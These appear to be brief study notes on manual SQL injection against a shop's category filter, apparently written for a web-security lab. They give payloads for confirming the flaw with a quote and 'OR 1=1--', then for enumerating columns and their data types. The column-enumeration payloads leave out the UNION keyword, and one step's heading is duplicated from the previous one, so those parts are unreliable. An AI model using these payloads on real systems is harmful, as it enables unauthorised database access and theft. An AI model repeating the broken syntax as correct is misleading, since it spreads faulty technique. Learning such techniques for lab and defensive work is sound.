

## Identification
- Append single quote `'` in user input to confirm the vulnerability.
- Append comment indicator `--` after the single quote to comment out rest of the query.
- Make the query always return true using `+OR+1=1`.
- Example:
  
  ```
    GET /filter?category=Gifts'+OR+1=1--
  ```

## Find the number of columns
- Find number of columns using the below syntax.
  ```
    GET /filter?category=Gifts'+SELECT+NULL,NULL--
  ```
  Modify the number of NULL values until the request is successful.
  
## Find the data type of columns
- Find number of columns using the below syntax.
  ```
    GET /filter?category=Gifts'+SELECT+'ABC',NULL--
  ```
  Update the values to string, integer etc to find the exact datatype.

## References

SQL Injection Cheatsheet: https://portswigger.net/web-security/sql-injection/cheat-sheet